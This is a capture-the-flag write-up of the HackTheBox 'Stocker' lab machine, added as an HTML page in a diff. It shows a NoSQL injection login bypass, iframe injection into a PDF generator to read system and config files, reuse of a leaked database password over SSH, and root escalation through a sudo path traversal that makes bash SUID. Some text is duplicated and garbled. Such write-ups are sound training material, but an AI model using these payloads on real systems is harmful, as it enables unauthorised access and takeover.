@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Stocker HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/stocker.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Stocker HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolution of the Stocker machine from the HackTheBox platform" />
+<meta property="og:description" content="Resolution of the Stocker machine from the HackTheBox platform" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Stocker HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Stocker HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolution of the Stocker machine from the HackTheBox platform","headline":"Writeup Stocker HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Stocker HackTheBox</h1>
+          <p>Resolution of the Stocker machine from the HackTheBox platform</p>
+        </div>
+
+        <div><p>We start by scanning the ports of the machine with nmap</p></div>
+        <div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+        <code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.196
+        Nmap scan report for
+        PORT STATE SERVICE
+        22 / tcp open ssh
+        80 / tcp open http://
+        </code></pre></div></div>
+        
+        <div><p>By doing a simple curl and looking at the headers we can see the domain stocker.htb</p></div>
+        <div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+        <code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.196 -I | </span><span class="s2">grep</span><span class="p"> Location
+        Location: http://stocker.htb/</span>
+        </code></pre></div></div>
+        
+        <div><p>With a valid domain we search for subdomains and find dev.stocket.htb</p></div>
+        <div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+        <code><span class="s2">❯ gobuster </span><span class="p">vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains- top1million-5000.txt
+        ================================================== ==============
+        [+] URL: http://stocker.htb
+        [+] Threads:
+        [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+        ================================================== ==============
+        Starting GoBuster in VHOST enumeration mode
+        ================================================== ==============
+        Found: </span><span class="kd">dev.stocker.htb</span><span class="p">(Status: 302) [Size: 28]</span>
+        </code></pre></div></div>
+        
+        <div><p>In this domain we find an authentication panel</p></div>
+        <div><p><img src="./1.png"><p></div>
+        
+        <div><p>After trying several things we can change the request to cause a non sql injection</p></div>
+        <div><p>We have examples in <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass">hacktricks</a>, remember to change the Content- Type by application/json</p></div>
+        <div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+        <code><span class="p">{</span><span class="s2">"username"</span><span class="p">: {</span><span class=" s2">"$ne"</span><span class="p">: </span><span class="na">null</span><span class="p">}, </span ><span class="s2">"password": {</span><span class="p">"$ne"</span><span class= "p">: </span><span class="na">null</span><span class="p">} }</span>
+        </code></pre></div></div>
+        <div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+        <code><span class="p">ContentType: application/json</span>
+        </code></pre></div></div>
+        <div><p><img src="./2.png"><p></div>
+        
+        <div><p>When giving forward it shows us a store class where we can add items to the cart</p></div>
+        <div><p><img src="./3.png"><p></div>
+        
+        <div><p>We add anything and when we give it to View Cart it shows us this</p></div>
+        <div><p><img src="./4.png"><p></div>
+        <div><p>When you give it to submit it shows us an identifier and a linked in here</p></div>
+        <div><p><img src="./5.png"><p></div>
+        <div><p>The link redirects us to /api/po/ and the identifier, shows us a pdf</p></div>
+        <div><p><img src="./6.png"><p></div>
+        
+        <div><p>Returning to this part by giving it submit and intercept we can see a structure in json</p></div>
+        <div><p><img src="./4.png"><p></div>
+        <div><p><img src="./7.png"><p></div>
+
+          <div><p>We can modify it and pass it a structure that includes a file, the /etc/passwd</p></div>
+          <div><p>We can modify it and pass it a structure that includes a file, the /etc/passwd</p></div>
+          <div><p>Podemos modificarlo y pasarle una estructura que incluya un archivo, el /etc/passwd</p></div>
+          <div><p>We can modify it and give it a structure that includes a file, the /etc/passwd</p></div>
+          <div><p>Podemos modificarlo y darle una estructura que incluya un archivo, el /etc/passwd</p></div>
+          
+          <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+          <code><span class="no">"title"</span><span class="p">:</span><span class="s2">"&ltiframe src=file:///etc/ passwd height=750px width=750px>&lt/iframe>"</span><span class="p">,</span>
+          </code></pre></div></div>
+          <div><p><img src="./8.png"><p></div>
+          <div><p>In the response when sending the request we can see the pdf identifier</p></div>
+          <div><p><img src="./9.png"><p></div>
+          <div><p>We open /api/po and the identifier, we can see the /etc/passwd and identify a user</p></div>
+          <div><p><img src="./10.png"><p></div>
+          <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+          <code><span class="p">angoose:x:1001:1001:,,,:/home/angoose:/bin/bash</span>
+          </code></pre></div></div>
+          
+          <div><p>With wappalizer we can identify the technologies, also since the subdomain is dev it may be that /var/www/dev/index.js is a valid configuration file</p></div>
+          <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+          <code><span class="no">"title"</span><span class="p">:</span><span class="s2">"&ltiframe src=file:///var/ www/dev/index.js height=800px width=800px>&lt/iframe>"</span><span class="p">,</span>
+          </code></pre></div></div>
+          <a href="./12.png" target="_blank"><div><p><img src="./12.png"><p></div></a><br>
+
+<div><p>Again we see the identifier in the response and we can read the file</p></div>
+<div><p><img src="./13.png"><p></div>
+<div><p><img src="./14.png"><p></div>
+
+<div><p>One of the lines in the file connects to mongodb, and has a password</p></div>
+<div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+< code><span class="k">const </span><span class="p">dbURI </span><span class="kd">=</span><span class="s2"> "mongodb://dev:</span><span class="kd">IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1"</span><span class ="p">;</span>
+</code></pre></div></div>
+
+<div><p>We can reuse the password with the user we find and connect via ssh</p></div>
+<div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> angoose@10.10.11.196
+angoose@10.10.11.196's password: </span><span class="kd">IHeardPassphrasesArePrettySecure
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class=" p">$id
+uid=1001(change) gid=1001(change) groups=1001(change)
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class=" p">$hostname -I
+10.10.11.196
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class=" p">$cat user.txt
+**************************
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class=" p">$</span>
+</code></pre></div></div>
+
+<div><p>At sudoers level we can run any js with node as root while specifying the path /usr/local/scripts/</p></div>
+<div class="language-python highlighter-red"><div class="highlight"><pre class="highlight">
+<code><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class="p ">$ sudo -l
+[sudo] password for angoose: </span><span class="p">IHeardPassphrasesArePrettySecure
+Matching Default entries for Angoose on stocks:
+     secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+The angoose user can run the following commands on stocker:
+     (</span><span class="na">ALL</span><span class="p">) </span><span class="kd">/usr/bin/node /usr/local/ scripts/*.js
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span="na">~</span><span class=" p">$</span>
+</code></pre></div></div>
+
+<div><p>We define a js that makes us the bash suid and when we execute it we make a directory path traversal</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">angoose@stocker</span><span class="p">:</span><span class="na">~</span><span class="p ">$ cat pwned.js
+require('child_process').exec('chmod u+s /bin/bash')
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span class="na">~</span><span class=" p">$ sudo node /usr/local/scripts/../../../home/angoose/pwned.js
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span class="na">~</span><span class=" p">$</span>
+</code></pre></div></div>
+
+<div><p>Runned successfully, now bash is suid, we can become root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">angoose@stocker</span><span class="p">:</span><span class="na">~</span><span class="p ">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18 2022 </span><span class="kd">/bin/bash</span><span class="p">
+</span><span class="s2">angoose@stocker</span><span class="p">:</span><span class="na">~</span><span class=" p">$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# hostname -I
+10.10.11.196
+bash-5.0# cat /root/root.txt
+ef7****************************5c1
+bash-5.0#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Home</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
